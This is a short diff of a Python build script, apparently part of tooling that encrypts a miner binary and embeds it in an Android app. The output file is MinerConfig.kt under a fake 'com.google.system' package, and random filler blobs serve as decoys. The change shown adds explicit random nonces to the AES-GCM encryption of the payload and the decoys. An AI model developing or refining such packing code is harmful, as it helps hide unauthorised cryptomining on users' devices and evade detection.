@@ -23,7 +23,8 @@ CONFIG_DEST = Path("app/src/main/java/com/google/system/MinerConfig.kt")
 def encrypt_and_split(binary_path: str) -> bytes:
     data = Path(binary_path).read_bytes()
     key = os.urandom(32)
-    cipher = AES.new(key, AES.MODE_GCM)
+    nonce = os.urandom(12)
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
     ct, tag = cipher.encrypt_and_digest(data)
     blob = cipher.nonce + tag + ct
 
@@ -43,7 +44,8 @@ def encrypt_and_split(binary_path: str) -> bytes:
 def generate_placeholders() -> bytes:
     key = os.urandom(32)
     filler = os.urandom(4 * 1024 * 1024)
-    cipher = AES.new(key, AES.MODE_GCM)
+    nonce = os.urandom(12)
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
     ct, tag = cipher.encrypt_and_digest(filler)
     blob = cipher.nonce + tag + ct
 
